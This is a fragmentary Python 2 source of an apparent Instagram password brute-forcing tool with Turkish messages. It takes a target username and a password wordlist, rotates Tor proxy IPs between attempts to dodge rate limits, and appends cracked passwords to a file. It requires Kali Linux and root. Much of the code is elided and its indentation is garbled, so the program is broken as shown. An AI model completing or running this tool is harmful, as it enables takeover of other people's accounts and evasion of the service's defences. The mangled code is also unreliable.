...
class Instagram(TorManager,Browser):
	...
	def kill(self,msg=None):
		...
		try:
			if self.isFound:
				self.display(msg)
				print ' [-] Sifre Tespit Edildi'

				with open('sifretespit.txt','a') as f:
			...
			def connectionHandler(self):
				...
				def run(self):
					...
					def display(self,pwd=None):
						...
						print ''
						print ' +------- Instagram -------+'
						print ' [-] Kullanici Adi: {}{}{}'.format(creds,self.username.title(),self.n)
						print ' [-] Sifre: {}{}{}'.format(creds,pwd,self.n)
						print ' [-] Proxy IP: {}{}{}'.format(self.b,ip,self.n)
						print ' [-] Denemeler: {}{}{}'.format(self.y,attempts,self.n)
						print ''

						if not ip:
							print ' [-] Proxy IP Derleniyor {}...{}'.format(self.g,self.n)
							self.changeIp()
							time.sleep(1.3)
							self.display()
				def main():
					...
					args.add_argument('username',help='E-Mail adresi veya Kullanici Adi')
					args.add_argument('wordlist',help='Sifre Dosyasi')
					...
					except KeyboardInterrupt:engine.kill('Cikis yapiliyor {}...{}'.format(self.g,self.n))
					if not os.path.exists('/usr/sbin/tor'):
						engine.kill('TOR tespit edilemedi.'.format(engine.y,engine.r,engine.n))

				# does the account exists?
				if not engine.exists(engine.username):
					engine.kill('\'{}\' bulunamadı.'.format(engine.username.title()))
				...
				try:
					...
					if not engine.isFound:
						engine.kill('Cikis yapiliyor {}...{}'.format(engine.g,engine.n))

			if __name__ == '__main__':
				if not 'kali' in platform():
					exit('Kali Linux gerekiyor.')

			if os.getuid():
				exit('Root Izni olmadan giris yapilamaz.')
			else:
				main()
